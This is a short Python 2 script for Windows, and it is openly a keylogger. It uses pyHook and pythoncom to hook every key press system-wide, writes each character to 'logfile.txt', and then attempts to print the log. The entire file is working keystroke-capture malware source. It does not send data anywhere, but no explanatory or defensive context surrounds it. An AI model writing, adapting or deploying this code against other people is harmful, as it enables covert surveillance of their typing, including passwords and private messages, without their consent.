import pythoncom
import pyHook
import logging
import sys

LOG_FILENAME = 'logfile.txt'    #file to store keystrokes

#main function to handle keylogging events
def keylog():

    def OnKeyboardEvent(event):
        logging.basicConfig(filename = LOG_FILENAME,
                            level = logging.DEBUG,
                            format = '%(message)s'
                            )
        logging.log(10, chr(event.Ascii))
        return True

    hookMgr = pyHook.HookManager()        # create a hook manager
    hookMgr.KeyDown = OnKeyboardEvent     # watch for all keyboard events
    hookMgr.HookKeyboard()                # set the hook
    pythoncom.PumpMessages()              # wait forever   
    

#function to print contents from the file
def printfile(filename):
    f = open(filename, 'r')
    buffer = f.read()
    print buffer

#-------calling methods---------#  
keylog()
printfile(LOG_FILENAME)
